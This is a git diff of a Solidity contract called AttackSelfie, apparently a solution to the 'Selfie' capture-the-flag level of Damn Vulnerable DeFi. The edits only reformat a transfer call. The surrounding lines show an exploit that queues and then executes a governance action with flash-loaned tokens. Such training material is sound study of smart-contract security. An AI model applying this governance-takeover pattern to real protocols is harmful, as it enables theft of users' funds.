@@ -23,7 +23,10 @@ contract AttackSelfie {
             address(owner)
         );
         actionId = simpleGovernance.queueAction(msg.sender, data, 0);
-        DamnValuableTokenSnapshot(tokenAddress).transfer(address(selfiePool), amount);
+        DamnValuableTokenSnapshot(tokenAddress).transfer(
+            address(selfiePool),
+            amount
+        );
     }
 
     function loan(uint amt) public {
@@ -33,5 +36,4 @@ contract AttackSelfie {
     function attack() public {
         simpleGovernance.executeAction(actionId);
     }
-
 }
